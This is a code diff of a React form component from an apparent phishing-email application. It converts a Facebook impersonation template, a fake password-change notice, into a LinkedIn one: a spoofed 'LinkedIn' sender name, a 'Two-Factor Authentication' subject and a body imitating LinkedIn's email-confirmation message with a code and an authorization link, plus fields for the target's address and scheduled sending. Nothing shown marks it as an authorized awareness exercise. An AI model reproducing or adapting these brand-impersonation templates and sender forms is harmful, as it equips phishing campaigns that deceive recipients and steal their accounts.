@@ -70,20 +70,20 @@ const templateStyle ={
 
 }
 
-export function FacebookForm({ submitHandler, onScheduleEmail }) {
+export function LinkedInForm({ submitHandler, onScheduleEmail }) {
   // Styles
   const { classes } = useStyles();
   const { textarea } = textAreaStyles();
 
   // Inputs
-  const [subject, setSubject] = useState('Your Facebook password has been changed! ');
+  const [subject, setSubject] = useState('Two-Factor Authentication ');
   const [fromEmail, setFromEmail] = useState('phishedapp@gmail.com');
   const [to, setTo] = useState('');
   const [html, setHtml] = useState('');
-  const [fname, setFname] = useState('Facebook Security');
+  const [fname, setFname] = useState('LinkedIn');
   const [lname, setLname] = useState('');
   const [bodyName, setBodyName] = useState('');
-  const [template, setTemplate] = useState('facebook');
+  const [template, setTemplate] = useState('linkedin');
   const [submissionNote, setSubmissionNote] = useState("invisable");
 
 
@@ -97,7 +97,7 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
     setBodyName('');
 
     let from = `${fname} ${lname} ${fromEmail}`;
-    let validation = await submitHandler({ from, to, subject, html, bodyName, template})
+    let validation = await submitHandler({ from, to, subject, html,bodyName, template})
     
     setSubmissionNote(validation.toString())
     const timeId = setTimeout(() => {
@@ -113,15 +113,36 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
 
       <>
         <div style={templateStyle} >
-          <p>Hello [targetName],</p>
-          <p>Your Facebook password was changed on [datetime]</p>
-          <p>If you did this, you can safely disregard this email.</p>
-          <p>If you didn't do this, please <u>secure your account. </u></p>
-          <p>Thanks, </p>
-          <p>The Facebook Security Team</p>
+
+          <p>Hi [targetName] ,please confirm your email address to get full access to LinkedIn.</p>
+          <p>380567</p>
+          <p>Enter this code or click the button below.</p>
+          <p>Your privacy is important</p>
+          <p>We may send you member updates, recruiter messages, job suggestions, invitations, reminders, and promotional messages from us and our partners. You can change your preferences anytime.</p>
+          <p><u>Agree & Authorize your email</u></p>
         </div>
 
-        <form onSubmit={onClick} style={{marginTop: 20 }} >
+        
+        <form onSubmit={onClick} style={{marginTop: 20}} >
+
+          <TextInput
+              label="First Name"
+              placeholder="Jane"
+              classnames={classes}
+              mb={12}
+              value={fname}
+              onChange={(e) => setFname(e.target.value)}
+              required
+          />
+          <TextInput
+              label="Last Name"
+              placeholder="Doe"
+              classnames={classes}
+              mb={12}
+              value={lname}
+              onChange={(e) => setLname(e.target.value)}
+              required
+          />
 
           <TextInput
               label="Receiver Email"
@@ -153,7 +174,6 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
             <Link href="/scheduleEmail" passHref>
               <a
                   onClick={() =>
-
                     onScheduleEmail({ fname, lname, fromEmail, to, subject, html, template, bodyName })
                   }
               >
@@ -180,4 +200,4 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
   );
 }
 
-export default FacebookForm;
+export default LinkedInForm;
